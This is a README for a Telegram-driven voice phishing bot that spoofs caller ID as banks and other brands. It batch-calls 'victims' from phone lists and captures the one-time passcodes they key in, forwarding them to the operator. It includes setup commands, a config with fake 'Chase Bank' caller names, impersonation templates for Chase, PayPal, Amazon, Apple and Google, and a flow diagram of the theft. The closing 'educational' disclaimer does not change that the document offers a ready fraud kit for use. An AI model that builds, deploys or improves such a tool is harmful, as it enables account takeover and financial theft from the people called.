# 🍕 Pizza OTP Bot

Advanced Telegram-powered Voice OTP Spoofing System with Plivo Integration

## ⚡ Features

- **📱 Beautiful Telegram UI** - Inline keyboard menu with real-time updates
- **🎭 Caller ID Spoofing** - Show any number/name on victim's phone
- **📞 Voice OTP Capture** - Call victims and capture DTMF tones
- **📋 Campaign Management** - Batch calling with live progress tracking
- **📝 Service Templates** - Pre-built templates for Chase, PayPal, Amazon, etc.
- **⭐ Instant Notifications** - Get OTPs delivered to Telegram instantly
- **🗄️ SQLite Database** - Local storage with full campaign history
- **🐳 Docker Ready** - One-command deployment
- **⚡ High Performance** - Concurrent calling with rate limiting

## 🚀 Quick Start

### Prerequisites

1. **Telegram Bot** - Create via [@BotFather](https://t.me/BotFather)
2. **Plivo Account** - Sign up at [plivo.com](https://plivo.com)
3. **Verified Numbers** - Add and verify phone numbers in Plivo

### Installation

```bash
# Clone the repository
git clone <repo>
cd otp-bot

# Copy and edit config
cp config.yml.example config.yml
nano config.yml

# Run with Docker
docker-compose up -d
```

Or manually:

```bash
# Install Go 1.18+
go mod download
go build -o pizza-otp-bot .
./pizza-otp-bot -config config.yml
```

### Ngrok Setup (Required for Local Dev)

```bash
# Start ngrok tunnel
./ngrok http 3000

# Update config.yml with the ngrok URL
ngrok_url: "https://abc123.ngrok.io"
```

## ⚙️ Configuration

```yaml
# Telegram Bot Token
bot_token: "123456789:ABCdef..."

# Plivo Credentials
plivo_auth_id: "PAXXXXXXXXXX"
plivo_auth_token: "your_token"
plivo_number: "+15551234567"

# 🎭 CALLER ID SPOOFING (The Magic!)
# Spoof the caller ID - must be verified in Plivo
caller_id: "+15559876543"

# Display name on victim's phone
caller_name: "Chase Bank"

# Admin Telegram IDs
admin_ids:
  - 123456789

# Server & Performance
port: "3000"
ngrok_url: "https://your-ngrok.ngrok.io"
concurrency: 5
call_timeout: 60
```

## 📱 Telegram Commands

### Using the Menu (Recommended!)
Just send `/start` or `/menu` to see the beautiful inline keyboard menu!

### Quick Commands

| Command | Description |
|---------|-------------|
| `/start` | Show main menu |
| `/menu` | Show main menu |

### 📞 Calling
| Command | Description |
|---------|-------------|
| `/call +15551234567 chase` | Make single call |
| `/sms +15551234567 message` | Send SMS with spoofed caller |

### 📋 Campaigns
| Command | Description |
|---------|-------------|
| `/batch chase` | Start batch (reply to CSV) |
| `/campaigns` | List all campaigns |
| `/campaign 1` | Campaign details |
| `/stop 1` | Stop campaign |
| `/pause 1` | Pause campaign |
| `/resume 1` | Resume campaign |
| `/delete 1` | Delete campaign |

### 📝 Templates
| Command | Description |
|---------|-------------|
| `/templates` | List all templates |
| `/template chase` | Template details |
| `/addtemplate name\|voice\|greeting\|action\|otp\|confirm` | Add template |
| `/edittemplate ...` | Edit template |
| `/deltemplate name` | Delete template |

### 📊 Monitoring
| Command | Description |
|---------|-------------|
| `/stats` | Global statistics |
| `/logs 20` | Recent logs |
| `/export` | Export captures CSV |
| `/backup` | Database backup |

### ⚙️ Configuration
| Command | Description |
|---------|-------------|
| `/config` | Show current config |
| `/reload` | Hot-reload config |
| `/cleanup 30` | Clean old data |

## 🍕 Service Templates

Pre-built templates included:

| Template | Service | Use Case |
|---------|---------|----------|
| 🏦 chase | Chase Bank | Fraud alert |
| 🏦 bank_of_america | Bank of America | Account verification |
| 💳 paypal | PayPal | Payment alert |
| 📦 amazon | Amazon | Order confirmation |
| 🎬 netflix | Netflix | Billing update |
| 🍎 apple | Apple | ID verification |
| 🔍 google | Google | Security alert |
| 🎮 steam | Steam | Trade verification |
| 🏦 wells_fargo | Wells Fargo | Fraud alert |
| 💳 citi | Citibank | Account alert |

## 📁 Batch CSV Format

Create a text file with one phone number per line:

```csv
+15551234567
+15559876543
+15551112222
+15553334455
```

**How to use:**
1. Send the CSV file to the bot
2. Reply to the file with `/batch chase`

## 🐳 Docker Commands

```bash
# Start the bot
docker-compose up -d

# View live logs
docker-compose logs -f

# Stop the bot
docker-compose down

# Rebuild and start
docker-compose up -d --build
```

## 🔧 Ngrok Setup

Required for local development to receive Plivo webhooks:

```bash
# Download and install ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
./ngrok authtoken YOUR_TOKEN

# Start the tunnel
./ngrok http 3000

# Copy the https URL to config.yml
ngrok_url: "https://abc123.ngrok.io"
```

## 📊 How It Works

```
┌─────────────────────────────────────────────────────────┐
│                    CAMPAIGN FLOW                         │
├─────────────────────────────────────────────────────────┤
│  1. 📋 Start Campaign (batch or single call)            │
│              ↓                                           │
│  2. 📞 Bot calls victim (spoofed caller ID)            │
│              ↓                                           │
│  3. 🔔 Victim sees: "Chase Bank" (+15559876543)        │
│              ↓                                           │
│  4. 👤 Victim answers → hears greeting                  │
│              ↓                                           │
│  5. ⏳ "Press 1 to verify"                             │
│              ↓                                           │
│  6. 🔐 Victim enters OTP → captured!                     │
│              ↓                                           │
│  7. 📲 You get notified with OTP in Telegram!          │
└─────────────────────────────────────────────────────────┘
```

## 🎭 Caller ID Spoofing

The bot supports **full caller ID spoofing**:

| Setting | Config Key | Example |
|---------|------------|---------|
| Spoof Number | `caller_id` | `+15559876543` |
| Display Name | `caller_name` | `Chase Bank` |

**Result on victim's phone:**
```
Incoming Call from:
Chase Bank
+15559876543
```

> ⚠️ The spoofed number must be verified in your Plivo account!

## 📦 Project Structure

```
pizza-otp-bot/
├── main.go              # Entry point
├── bot/
│   ├── handlers.go      # Command handlers
│   ├── handlers2.go     # Campaign handlers
│   ├── campaign.go      # Call processing
│   ├── wizard.go        # Inline keyboard UI
│   └── webhooks.go      # Plivo webhooks
├── db/
│   └── database.go      # SQLite operations
├── voice/
│   └── plivo.go        # Plivo API wrapper
├── config/
│   └── loader.go       # Config management
├── models/
│   └── models.go       # Data structures
├── config.yml.example   # Config template
├── Dockerfile          # Container
├── docker-compose.yml   # Docker setup
└── README.md           # This file!
```

## 🔐 Security Notes

- ⚠️ Keep `config.yml` private and never commit it
- ⚠️ Restrict `admin_ids` to trusted users only
- ⚠️ Use a firewall on your server
- ⚠️ Consider using environment variables in production

## ⚠️ Disclaimer

This tool is for **educational and authorized security testing purposes only**. 
Unauthorized OTP interception is illegal. Use responsibly and only with proper authorization.

## 📜 License

MIT License - See LICENSE file for details.

---

🍕 **Pizza OTP Bot v1.0** - Built with ❤️ for security research
